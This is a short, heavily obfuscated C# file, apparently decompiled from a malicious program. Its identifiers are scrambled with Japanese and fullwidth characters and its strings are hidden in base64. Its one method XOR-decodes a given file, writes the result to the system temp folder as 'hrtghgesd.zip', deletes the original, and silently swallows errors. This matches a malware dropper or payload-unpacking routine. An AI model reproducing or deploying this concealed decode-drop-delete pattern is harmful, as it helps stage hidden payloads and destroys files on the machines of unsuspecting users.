using System;
using System.IO;
using System.Text;

internal class C
{
	public static string 俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮0iXzGh9sJBsSwrhgjj8J168OF俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮 = Encoding.UTF8.GetString(Convert.FromBase64String("aHJ0Z2hnZXNk"));

	public static bool Q469716ncdnqEoQ2YTy3jdePT51y3f(string A)
	{
		try
		{
			if (File.Exists(A))
			{
				byte[] array = File.ReadAllBytes(A);
				for (int i = 0; i < array.Length; i++)
				{
					array[i] ^= 1;
				}
				File.WriteAllBytes(Path.GetTempPath() + 俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮0iXzGh9sJBsSwrhgjj8J168OF俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮 + Encoding.UTF8.GetString(Convert.FromBase64String("LnppcA==")), array);
				File.Delete(A);
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}
}
